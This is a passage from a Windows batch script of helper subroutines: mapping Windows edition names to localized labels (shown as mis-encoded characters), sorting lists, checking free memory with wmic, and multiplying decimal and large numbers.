if /i "!system!" equ "Microsoft Windows 7 Ultimate" (set system= - Windows 7 �콢��)
if /i "!system!" equ "Microsoft Windows 7 Home Basic" (set system= - Windows 7 ��ͥ��ͨ��)
if /i "!system!" equ "Microsoft Windows 7 Home Premium" (set system= - Windows 7 ��ͥ�߼���)
if /i "!system!" equ "Microsoft Windows 7 Professional" (set system= - Windows 7 רҵ��)
if /i "!system!" equ "Microsoft Windows 7 Enterprise" (set system= - Windows 7 ��ҵ��)
goto :eof
:pd8
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 8 Pro" (set system= - Windows 8 רҵ��)
if /i "!system!" equ "Microsoft Windows 8 China" (set system= - Windows 8 �й���)
if /i "!system!" equ "Microsoft Windows 8 Enterprise" (set system= - Windows 8 ��ҵ��)
goto :eof
:pd8.1
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 8.1 Pro" (set system= - Windows 8.1 רҵ��)
if /i "!system!" equ "Microsoft Windows 8.1 China" (set system= - Windows 8.1 �й���)
if /i "!system!" equ "Microsoft Windows 8.1 Enterprise" (set system= - Windows 8.1 ��ҵ��)
goto :eof
:pd10
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 10 Home" (set system= - Windows 10 ��ͥ��)
if /i "!system!" equ "Microsoft Windows 10 Professional" (set system= - Windows 10 רҵ��)
if /i "!system!" equ "Microsoft Windows 10 Education" (set system= - Windows 10 ������)
if /i "!system!" equ "Microsoft Windows 10 Enterprise" (set system= - Windows 10 ��ҵ��)
goto :eof
:pd11
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 11 Home" (set system= - Windows 11 ��ͥ��)
if /i "!system!" equ "Microsoft Windows 11 Professional" (set system= - Windows 11 רҵ��)
if /i "!system!" equ "Microsoft Windows 11 Education" (set system= - Windows 11 ������)
if /i "!system!" equ "Microsoft Windows 11 Enterprise" (set system= - Windows 11 ��ҵ��)
goto :eof
:sortaz
setlocal
for /f "delims==" %%a in ('set p. 2^>nul')do set "%%a="
for /l %%a in (1 1 20) do set "p.lin=0000000000!p.lin!"
for %%a in (%~1) do (set s=!p.lin!%%a&set "s=!s:~-200!"
if defined p...!s! (set p..%%a=!p..%%a! %%a
set p...!s!=!p..%%a! %%a) else (set p...!s!=%%a))
for /f "tokens=2 delims==" %%a in ('set p...') do (
for %%i in (%%a) do set "p.ok=!p.ok! %%i")
endlocal&set %~2=%p.ok:~1%&goto :EOF
:sortza
setlocal
for /f "delims==" %%a in ('set p. 2^>nul')do set "%%a="
for /l %%a in (1 1 20) do set "p.lin=0000000000!p.lin!"
for %%a in (%~1) do (set s=!p.lin!%%a&set "s=!s:~-200!"
if defined p...!s! (set p..%%a=!p..%%a! %%a
set p...!s!=!p..%%a! %%a) else (set p...!s!=%%a))
for /f "tokens=2 delims==" %%a in ('set p...') do (
for %%i in (%%a) do set "p.ok=%%i !p.ok!")
endlocal&set %~2=%p.ok%&goto :EOF
:checkmem
setlocal
if "%1" equ "" (goto :eof)
if "%2" equ "" (goto :eof)
if "%3" equ "" (goto :eof)
for /f "tokens=2 delims==" %%a in ('"wmic OS get FreePhysicalMemory /Value"') do (
	set "mem=%%a"
	set "mem=!mem:~0,-1!"
	if !mem! %1 %2 (
		endlocal&set %3=1
	) else (
		endlocal&set %3=0
	)
)
goto :eof
:xcf
setlocal
set "num1=%1"
set "num2=%2"
if "!num1!" equ "" (
	goto :eof
) else (
	for /f "delims=-.0123456789" %%a in ("!num1!") do (
		goto :eof
	)
	for /f "tokens=1,2 delims=." %%a in ("!num1!") do (
		set "num1a=%%a"
		set "num1b=%%b"
	)
)
if "!num1a!" equ "0" (
	set num1a=
)
:xcf_loop1
if "!num1b:~-1!" equ "0" (
	set "num1b=!num1b:~0,-1!"
	goto xcf_loop1
)
if "!num1b!" equ "" (
	set dot1=0
) else (
	call :strlen num1b dot1
)
if "!num2!" equ "0" (
	goto :eof
) else (
	for /f "delims=-.0123456789" %%a in ("!num2!") do (
		goto :eof
	)
	for /f "tokens=1,2 delims=." %%a in ("!num2!") do (
		set "num2a=%%a"
		set "num2b=%%b"
	)
)
if "!num2a!" equ "0" (
	set num2a=
)
:xcf_loop2
if "!num2b:~-1!" equ "0" (
	set "num2b=!num2b:~0,-1!"
	goto xcf_loop2
)
if "!num2b!" equ "" (
	set dot2=0
) else (
	call :strlen num2b dot2
)
set /a "dot=dot1+dot2"
set /a "num=!num1a!!num1b!*!num2a!!num2b!"
set "numa=!num:~0,-%dot%!"
set "numb=!num:~-%dot%!"
:xcf_loop
if "!numb:~-1!" equ "0" (
	set "numb=!numb:~0,-1!"
	goto xcf_loop
)
if "!dot!" neq "0" (
	set "num=!numa!.!numb!"
)
if "!num:~-1!" equ "." (
	set "num=!num:~0,-1!"
)
if "!num:~0,1!" equ "." (
	set "num=!num:.=0.!"
)
if "!num:~0,2!" equ "-." (
	set "num=-0.!num:~2!"
)
if "%3" neq "" (
		endlocal&set "%3=%num%"
		goto :eof
) else (
		echo;!num!
		goto :eof
)
:scf
if "%~1"=="0" Endlocal&set %~3=0&goto :EOF
if "%~2"=="0" Endlocal&set %~3=0&goto :EOF
set f=&set jia=&set ji=&set /a n1=0,n2=0
set vard1=&set "vard2="&set var1=%~1&set "var2=%~2"
for /l %%a in (0 1 9) do (
set var1=!var1:%%a= %%a !&set var2=!var2:%%a= %%a !)
for %%a in (!var1!)do (set /a n1+=1&set vard1=%%a !vard1!)
for %%a in (!var2!)do (set /a n2+=1&set vard2=%%a !vard2!)
if !n1! gtr !n2! (set vard1=%vard2%&set vard2=%vard1%)
for %%a in (!vard1!) do (set "t="&set /a j=0
for %%b in (!vard2!) do (if "!jia!"=="" set /a jia=0
set /a a=%%a*%%b+j+!jia:~-1!&set "t=!a:~-1!!t!"
set a=0!a!&set "j=!a:~-2,1!"&set jia=!jia:~0,-1!)
set "ji=!t:~-1!!ji!"
if "!j:~0,1!"=="0" (set ss=) else set "ss=!j:~0,1!"
set jia=!ss!!t:~0,-1!)
if not "!j:~0,1!"=="0" set "t=!j:~0,1!!t!"
set "ji=!t!!ji:~1!"
Endlocal&set %~3=%ji%&goto :EOF
